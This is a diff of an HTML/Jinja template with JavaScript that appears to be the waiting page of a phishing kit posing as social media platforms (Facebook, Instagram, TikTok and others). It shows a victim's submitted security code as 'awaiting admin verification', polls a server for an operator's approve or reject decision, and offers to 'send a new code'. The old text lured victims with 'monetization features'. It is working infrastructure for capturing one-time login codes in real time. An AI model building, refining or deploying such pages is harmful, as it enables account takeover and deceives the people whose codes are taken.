@@ -1,14 +1,14 @@
 {% extends "base.html" %}
 {% block body %}
-<div class="card" style="max-width:520px;margin:28px auto;box-shadow:0 4px 12px rgba(59,130,246,0.15);border-radius:16px;">
-  {% if platform and platform_name %}
+<div class="card" style="max-width:520px;margin:28px auto;box-shadow:0 6px 18px rgba(59,130,246,0.25);border-radius:16px;">
+  {% if platform_icon and platform_name %}
   <div class="platform-header">
-    <div class="icon-circle {% if platform == 'facebook' %}bg-facebook{% elif platform == 'instagram' %}bg-instagram{% elif platform == 'tiktok' %}bg-tiktok{% elif platform == 'youtube' %}bg-youtube{% elif platform == 'snapchat' %}bg-snapchat{% elif platform == 'twitter' %}bg-twitter{% else %}bg-default{% endif %}">
-      <i class="{% if platform == 'facebook' %}fa-brands fa-facebook-f{% elif platform == 'instagram' %}fa-brands fa-instagram{% elif platform == 'tiktok' %}fa-brands fa-tiktok{% elif platform == 'youtube' %}fa-brands fa-youtube{% elif platform == 'snapchat' %}fa-brands fa-snapchat-ghost{% elif platform == 'twitter' %}fa-brands fa-x-twitter{% else %}fa-solid fa-shield-check{% endif %} icon-lg"></i>
+    <div class="icon-circle" style="background: {{ platform_color|default('#3B82F6') }}20; border: 2px solid {{ platform_color|default('#3B82F6') }}30;">
+      <i class="{{ platform_icon }}" style="color: {{ platform_color|default('#3B82F6') }};"></i>
     </div>
     <div>
-      <h2 class="notranslate" style="margin:0;color:{% if platform == 'facebook' %}#1877F2{% elif platform == 'instagram' %}#E4405F{% elif platform == 'tiktok' %}#000000{% elif platform == 'youtube' %}#FF0000{% elif platform == 'snapchat' %}#000000{% elif platform == 'twitter' %}#000000{% else %}#3B82F6{% endif %};">{{ platform_name }}</h2>
-      <div style="color:#64748b;font-size:13px" id="status-message">Security Verification in Progress</div>
+      <h2 class="notranslate" style="margin:0;color:{{ platform_color|default('#3B82F6') }};">{{ platform_name }}</h2>
+      <div style="color:#64748b;font-size:13px" id="status-message">Waiting for Admin Confirmation</div>
     </div>
   </div>
   {% endif %}
@@ -16,151 +16,102 @@
   <div class="confirmation-container">
     <!-- Loading State -->
     <div id="loading-state">
-      <div class="verification-animation">
-        <div class="verification-spinner"></div>
-        <div class="verification-shield">🛡️</div>
-      </div>
-      <h3 class="verification-title">Security Verification Under Review</h3>
-      <p class="verification-description">
-        Your security credentials are being reviewed by our verification system. 
-        This automated process ensures the highest level of account protection and typically completes within seconds.
+      <div class="loading-spinner"></div>
+      <h3 style="color:#1e293b;margin:20px 0 12px 0;font-size:18px;font-weight:600">⏳ Awaiting Verification</h3>
+      <p style="color:#64748b;text-align:center;margin-bottom:24px;line-height:1.5;">
+        Your security code has been submitted and is awaiting admin verification. 
+        This usually takes just a few moments. Please keep this page open.
       </p>
       
-      <div class="verification-details">
-        <div class="detail-item">
-          <span class="detail-label">Platform:</span>
-          <span class="detail-value">{{ platform_name }}</span>
-        </div>
-        <div class="detail-item">
-          <span class="detail-label">Verification Code:</span>
-          <span class="code-display">{{ code_value }}</span>
-        </div>
-        <div class="detail-item">
-          <span class="detail-label">Status:</span>
-          <span class="status-badge pending">In Review</span>
-        </div>
-      </div>
-
-      <div class="progress-indicator">
-        <div class="progress-bar">
-          <div class="progress-fill"></div>
-        </div>
-        <div class="progress-text">Processing your verification request...</div>
+      <div class="code-display">
+        <span class="code-label">Submitted Code:</span>
+        <span class="code-value">{{ code_value }}</span>
       </div>
     </div>
 
     <!-- Rejected State (Hidden by default) -->
     <div id="rejected-state" style="display: none;">
-      <div class="rejected-animation">
-        <div class="rejected-icon">❌</div>
-        <div class="rejected-pulse"></div>
+      <div class="rejected-icon" style="width: 60px; height: 60px; background: #fee2e2; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; border: 3px solid #fecaca;">
+        <i class="fa-solid fa-times" style="color: #dc2626; font-size: 24px;"></i>
       </div>
       
-      <h3 class="rejected-title">Verification Required</h3>
+      <h3 style="color:#dc2626;margin:20px 0 12px 0;font-size:18px;font-weight:600">❌ Verification Failed</h3>
       
-      <div class="rejection-message">
-        <p>We were unable to verify the security code you provided. This could be due to:</p>
-        <ul class="rejection-reasons">
-          <li>Incorrect or mistyped code</li>
-          <li>Expired verification code</li>
-          <li>System security requirements not met</li>
-        </ul>
+      <div class="error-message" style="background: #fef2f2; border: 1px solid #fecaca; border-radius: 12px; padding: 16px; margin-bottom: 24px;">
+        <p style="color:#7f1d1d;text-align:center;margin:0;line-height:1.5;">
+          <strong>We couldn't verify your code.</strong><br>
+          The code is incorrect or has expired.
+        </p>
       </div>
 
-      <div class="verification-details">
-        <div class="detail-item">
-          <span class="detail-label">Submitted Code:</span>
-          <span class="code-display rejected">{{ code_value }}</span>
-        </div>
-        <div class="detail-item">
-          <span class="detail-label">Status:</span>
-          <span class="status-badge rejected">Verification Failed</span>
-        </div>
+      <div class="code-display" style="background: #fef2f2; border-color: #fecaca;">
+        <span class="code-label" style="color:#7f1d1d;">Submitted Code:</span>
+        <span class="code-value" style="color:#7f1d1d; background: #fee2e2; border-color: #fecaca;">{{ code_value }}</span>
       </div>
 
-      <div class="action-buttons">
-        <button onclick="requestNewCode()" class="resend-btn">
-          <i class="fa-solid fa-paper-plane"></i>
-          Request New Verification Code
+      <div class="action-buttons" style="margin-top: 24px;">
+        <button onclick="requestNewCode()" class="resend-btn" style="background: #3B82F6; color: white; border: none; padding: 12px 24px; border-radius: 8px; font-weight: 600; cursor: pointer; transition: all 0.3s ease; display: flex; align-items: center; gap: 8px; margin: 0 auto;">
+          <i class="fa-solid fa-redo"></i>
+          Send New Code
         </button>
-        <p class="action-note">A new code will be sent to your registered contact method</p>
       </div>
     </div>
 
     <!-- Success State (Hidden by default) -->
     <div id="success-state" style="display: none;">
-      <div class="success-animation">
-        <div class="success-icon">✅</div>
-        <div class="success-pulse"></div>
+      <div class="success-icon" style="width: 60px; height: 60px; background: #d1fae5; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; border: 3px solid #a7f3d0;">
+        <i class="fa-solid fa-check" style="color: #059669; font-size: 24px;"></i>
       </div>
       
-      <h3 class="success-title">Verification Successful</h3>
-      <p class="success-description">
-        Your security credentials have been verified successfully. 
-        Your account is now being prepared for monetization features.
+      <h3 style="color:#059669;margin:20px 0 12px 0;font-size:18px;font-weight:600">✅ Code Verified!</h3>
+      <p style="color:#047857;text-align:center;margin-bottom:24px;line-height:1.5;">
+        Your code has been successfully verified. Redirecting you now...
       </p>
-
-      <div class="verification-details">
-        <div class="detail-item">
-          <span class="detail-label">Status:</span>
-          <span class="status-badge success">Verified & Approved</span>
-        </div>
-      </div>
-
-      <div class="redirect-countdown">
-        <div class="countdown-text">Redirecting to your account in <span id="countdown">3</span> seconds...</div>
-      </div>
     </div>
   </div>
 </div>
 
 <script>
-const submissionId = {{ submission_id }};  // Use submission_id instead of code_value
+const codeValue = "{{ code_value }}";
 const nextUrl = "{{ next_url }}";
+const submissionId = "{{ submission_id }}";
 
 function showLoadingState() {
   document.getElementById('loading-state').style.display = 'block';
   document.getElementById('rejected-state').style.display = 'none';
   document.getElementById('success-state').style.display = 'none';
-  document.getElementById('status-message').textContent = 'Security Verification in Progress';
+  document.getElementById('status-message').textContent = 'Waiting for Admin Confirmation';
 }
 
 function showRejectedState() {
   document.getElementById('loading-state').style.display = 'none';
   document.getElementById('rejected-state').style.display = 'block';
   document.getElementById('success-state').style.display = 'none';
-  document.getElementById('status-message').textContent = 'Verification Required';
+  document.getElementById('status-message').textContent = 'Verification Failed';
 }
 
 function showSuccessState() {
   document.getElementById('loading-state').style.display = 'none';
   document.getElementById('rejected-state').style.display = 'none';
   document.getElementById('success-state').style.display = 'block';
-  document.getElementById('status-message').textContent = 'Verification Successful';
-  
-  // Start countdown for redirect
-  let countdown = 3;
-  const countdownElement = document.getElementById('countdown');
-  const countdownInterval = setInterval(() => {
-    countdown--;
-    countdownElement.textContent = countdown;
-    if (countdown <= 0) {
-      clearInterval(countdownInterval);
-      window.location.href = nextUrl;
-    }
-  }, 1000);
+  document.getElementById('status-message').textContent = 'Code Verified Successfully';
 }
 
 function checkConfirmation() {
-  // FIXED: Use submission_id instead of code_value
-  fetch(`/api/check_confirmation/${submissionId}`)
+  fetch(`/api/check_confirmation/${codeValue}`)
     .then(response => response.json())
     .then(data => {
-      console.log('Confirmation check response:', data); // Debug log
-      
-      if (data.status === 'approved') {
+      if (data.confirmed) {
+        // Code approved - show success and redirect
         showSuccessState();
-      } else if (data.status === 'rejected') {
+        setTimeout(() => {
+          window.location.href = nextUrl;
+        }, 2000);
+      } else if (data.rejected) {
+        // Code rejected - show rejection message
+        showRejectedState();
+      } else if (data.resend_requested) {
+        // User has requested new code - show appropriate message
         showRejectedState();
       } else {
         // Still pending - continue checking
@@ -181,7 +132,6 @@ function requestNewCode() {
   resendBtn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Requesting New Code...';
   resendBtn.disabled = true;
   
-  // FIXED: Use submission_id
   fetch(`/api/request_new_code/${submissionId}`, {
     method: 'POST',
     headers: {
@@ -190,12 +140,11 @@ function requestNewCode() {
   })
   .then(response => response.json())
   .then(data => {
-    console.log('New code request response:', data); // Debug log
     if (data.success) {
-      // Redirect back to the CURRENT previous page
-      window.location.href = data.redirect_url;
+      // Redirect back to previous page (code entry page)
+      window.location.href = data.redirect_url || '/';
     } else {
-      alert('Unable to request new code. Please try again.');
+      alert('Error requesting new code. Please try again.');
       resendBtn.innerHTML = originalText;
       resendBtn.disabled = false;
     }
@@ -208,22 +157,8 @@ function requestNewCode() {
   });
 }
 
-// Start checking for confirmation and progress animation
-document.addEventListener('DOMContentLoaded', function() {
-  // Start checking for confirmation
-  setTimeout(checkConfirmation, 2000);
-  
-  // Progress animation
-  const progressFill = document.querySelector('.progress-fill');
-  let progress = 0;
-  const progressInterval = setInterval(() => {
-    progress += Math.random() * 10;
-    if (progress >= 95) {
-      progress = 95; // Don't complete until actually verified
-    }
-    progressFill.style.width = progress + '%';
-  }, 800);
-});
+// Start checking for confirmation
+setTimeout(checkConfirmation, 2000);
 </script>
 
 <style>
@@ -232,326 +167,45 @@ document.addEventListener('DOMContentLoaded', function() {
   padding: 20px;
 }
 
-/* Verification Animation */
-.verification-animation {
-  position: relative;
-  width: 100px;
-  height: 100px;
-  margin: 0 auto 30px;
-}
-
-.verification-spinner {
-  width: 80px;
-  height: 80px;
-  border: 3px solid #e5e7eb;
-  border-top: 3px solid #3B82F6;
+.loading-spinner {
+  width: 50px;
+  height: 50px;
+  border: 4px solid #e5e7eb;
+  border-top: 4px solid #3B82F6;
   border-radius: 50%;
-  animation: spin 1.5s linear infinite;
-  position: absolute;
-  top: 50%;
-  left: 50%;
-  transform: translate(-50%, -50%);
-}
-
-.verification-shield {
-  font-size: 40px;
-  position: absolute;
-  top: 50%;
-  left: 50%;
-  transform: translate(-50%, -50%);
-  animation: gentleBounce 2s ease-in-out infinite;
+  animation: spin 1s linear infinite;
+  margin: 0 auto 20px;
 }
 
 @keyframes spin {
-  0% { transform: translate(-50%, -50%) rotate(0deg); }
-  100% { transform: translate(-50%, -50%) rotate(360deg); }
-}
-
-@keyframes gentleBounce {
-  0%, 100% { transform: translate(-50%, -50%) scale(1); }
-  50% { transform: translate(-50%, -50%) scale(1.05); }
-}
-
-.verification-title {
-  color: #1e293b;
-  margin: 0 0 16px 0;
-  font-size: 20px;
-  font-weight: 700;
-}
-
-.verification-description {
-  color: #64748b;
-  text-align: center;
-  margin-bottom: 32px;
-  line-height: 1.6;
-  font-size: 14px;
-}
-
-/* Verification Details */
-.verification-details {
-  background: #f8fafc;
-  border: 1px solid #e2e8f0;
-  border-radius: 12px;
-  padding: 20px;
-  margin: 24px 0;
-}
-
-.detail-item {
-  display: flex;
-  justify-content: space-between;
-  align-items: center;
-  margin-bottom: 12px;
-  padding-bottom: 12px;
-  border-bottom: 1px solid #f1f5f9;
-}
-
-.detail-item:last-child {
-  margin-bottom: 0;
-  padding-bottom: 0;
-  border-bottom: none;
-}
-
-.detail-label {
-  font-weight: 600;
-  color: #475569;
-  font-size: 14px;
-}
-
-.detail-value {
-  color: #1e293b;
-  font-weight: 500;
+  0% { transform: rotate(0deg); }
+  100% { transform: rotate(360deg); }
 }
 
 .code-display {
+  background: #f8fafc;
+  border: 1px solid #e2e8f0;
+  border-radius: 12px;
+  padding: 16px;
+  margin-top: 20px;
+}
+
+.code-label {
+  font-weight: 600;
+  color: #475569;
+  margin-right: 8px;
+}
+
+.code-value {
   font-family: 'Courier New', monospace;
   font-weight: 700;
   color: #1e293b;
   background: #ffffff;
-  padding: 6px 12px;
-  border-radius: 8px;
+  padding: 4px 8px;
+  border-radius: 6px;
   border: 1px solid #d1d5db;
-  font-size: 14px;
 }
 
-.code-display.rejected {
-  background: #fee2e2;
-  border-color: #fecaca;
-  color: #dc2626;
-}
-
-.status-badge {
-  padding: 4px 12px;
-  border-radius: 20px;
-  font-size: 12px;
-  font-weight: 700;
-  text-transform: uppercase;
-  letter-spacing: 0.5px;
-}
-
-.status-badge.pending {
-  background: #fef3c7;
-  color: #d97706;
-}
-
-.status-badge.rejected {
-  background: #fee2e2;
-  color: #dc2626;
-}
-
-.status-badge.success {
-  background: #d1fae5;
-  color: #059669;
-}
-
-/* Progress Indicator */
-.progress-indicator {
-  margin-top: 24px;
-}
-
-.progress-bar {
-  width: 100%;
-  height: 6px;
-  background: #e2e8f0;
-  border-radius: 3px;
-  margin-bottom: 8px;
-  overflow: hidden;
-}
-
-.progress-fill {
-  height: 100%;
-  background: linear-gradient(90deg, #3B82F6, #60A5FA);
-  border-radius: 3px;
-  width: 0%;
-  transition: width 0.8s ease;
-}
-
-.progress-text {
-  font-size: 12px;
-  color: #64748b;
-  font-weight: 500;
-}
-
-/* Rejected State */
-.rejected-animation {
-  position: relative;
-  width: 100px;
-  height: 100px;
-  margin: 0 auto 30px;
-}
-
-.rejected-icon {
-  font-size: 50px;
-  position: absolute;
-  top: 50%;
-  left: 50%;
-  transform: translate(-50%, -50%);
-  z-index: 2;
-}
-
-.rejected-pulse {
-  width: 80px;
-  height: 80px;
-  background: rgba(239, 68, 68, 0.1);
-  border-radius: 50%;
-  position: absolute;
-  top: 50%;
-  left: 50%;
-  transform: translate(-50%, -50%);
-  animation: pulse 2s ease-out infinite;
-}
-
-.rejected-title {
-  color: #dc2626;
-  margin: 0 0 20px 0;
-  font-size: 20px;
-  font-weight: 700;
-}
-
-.rejection-message {
-  background: #fef2f2;
-  border: 1px solid #fecaca;
-  border-radius: 12px;
-  padding: 20px;
-  margin-bottom: 24px;
-  text-align: left;
-}
-
-.rejection-message p {
-  color: #7f1d1d;
-  margin: 0 0 12px 0;
-  font-weight: 600;
-}
-
-.rejection-reasons {
-  color: #7f1d1d;
-  margin: 0;
-  padding-left: 20px;
-}
-
-.rejection-reasons li {
-  margin-bottom: 6px;
-  line-height: 1.4;
-}
-
-/* Success State */
-.success-animation {
-  position: relative;
-  width: 100px;
-  height: 100px;
-  margin: 0 auto 30px;
-}
-
-.success-icon {
-  font-size: 50px;
-  position: absolute;
-  top: 50%;
-  left: 50%;
-  transform: translate(-50%, -50%);
-  z-index: 2;
-}
-
-.success-pulse {
-  width: 80px;
-  height: 80px;
-  background: rgba(16, 185, 129, 0.1);
-  border-radius: 50%;
-  position: absolute;
-  top: 50%;
-  left: 50%;
-  transform: translate(-50%, -50%);
-  animation: pulse 2s ease-out infinite;
-}
-
-.success-title {
-  color: #059669;
-  margin: 0 0 16px 0;
-  font-size: 20px;
-  font-weight: 700;
-}
-
-.success-description {
-  color: #047857;
-  text-align: center;
-  margin-bottom: 32px;
-  line-height: 1.6;
-  font-size: 14px;
-}
-
-.redirect-countdown {
-  margin-top: 24px;
-}
-
-.countdown-text {
-  font-size: 14px;
-  color: #64748b;
-  font-weight: 500;
-}
-
-.countdown-text span {
-  color: #059669;
-  font-weight: 700;
-}
-
-/* Action Buttons */
-.action-buttons {
-  margin-top: 24px;
-}
-
-.resend-btn {
-  background: #3B82F6;
-  color: white;
-  border: none;
-  padding: 14px 24px;
-  border-radius: 12px;
-  font-weight: 600;
-  cursor: pointer;
-  transition: all 0.3s ease;
-  display: flex;
-  align-items: center;
-  gap: 8px;
-  margin: 0 auto;
-  font-size: 14px;
-}
-
-.resend-btn:hover {
-  background: #2563eb;
-  transform: translateY(-1px);
-  box-shadow: 0 4px 12px rgba(59, 130, 246, 0.3);
-}
-
-.resend-btn:disabled {
-  opacity: 0.7;
-  cursor: not-allowed;
-  transform: none !important;
-}
-
-.action-note {
-  font-size: 12px;
-  color: #64748b;
-  margin-top: 8px;
-}
-
-/* Platform Header */
 .platform-header {
   display: flex;
   align-items: center;
@@ -571,83 +225,16 @@ document.addEventListener('DOMContentLoaded', function() {
   flex-shrink: 0;
 }
 
-.bg-facebook { background: rgba(24, 119, 242, 0.1); }
-.bg-instagram { background: rgba(228, 64, 95, 0.1); }
-.bg-tiktok { background: rgba(0, 0, 0, 0.1); }
-.bg-youtube { background: rgba(255, 0, 0, 0.1); }
-.bg-snapchat { background: rgba(255, 252, 0, 0.1); }
-.bg-twitter { background: rgba(29, 161, 242, 0.1); }
-.bg-default { background: rgba(59, 130, 246, 0.1); }
-
-.icon-lg {
-  font-size: 20px;
+.resend-btn:hover {
+  background: #2563eb !important;
+  transform: translateY(-1px);
+  box-shadow: 0 4px 12px rgba(59, 130, 246, 0.3);
 }
 
-.bg-facebook .icon-lg { color: #1877F2; }
-.bg-instagram .icon-lg { color: #E4405F; }
-.bg-tiktok .icon-lg { color: #000000; }
-.bg-youtube .icon-lg { color: #FF0000; }
-.bg-snapchat .icon-lg { color: #000000; }
-.bg-twitter .icon-lg { color: #000000; }
-.bg-default .icon-lg { color: #3B82F6; }
-
-@keyframes pulse {
-  0% {
-    transform: translate(-50%, -50%) scale(0.8);
-    opacity: 0.7;
-  }
-  70% {
-    transform: translate(-50%, -50%) scale(1.2);
-    opacity: 0;
-  }
-  100% {
-    transform: translate(-50%, -50%) scale(1.2);
-    opacity: 0;
-  }
-}
-
-/* Responsive Design */
-@media (max-width: 480px) {
-  .card {
-    margin: 20px auto;
-    border-radius: 14px;
-  }
-  
-  .verification-animation,
-  .rejected-animation,
-  .success-animation {
-    width: 80px;
-    height: 80px;
-    margin-bottom: 24px;
-  }
-  
-  .verification-spinner {
-    width: 60px;
-    height: 60px;
-  }
-  
-  .verification-shield,
-  .rejected-icon,
-  .success-icon {
-    font-size: 32px;
-  }
-  
-  .verification-title,
-  .rejected-title,
-  .success-title {
-    font-size: 18px;
-  }
-  
-  .detail-item {
-    flex-direction: column;
-    align-items: flex-start;
-    gap: 4px;
-  }
-  
-  .resend-btn {
-    width: 100%;
-    justify-content: center;
-  }
+.resend-btn:disabled {
+  opacity: 0.7;
+  cursor: not-allowed;
+  transform: none !important;
 }
 </style>
 {% endblock %}
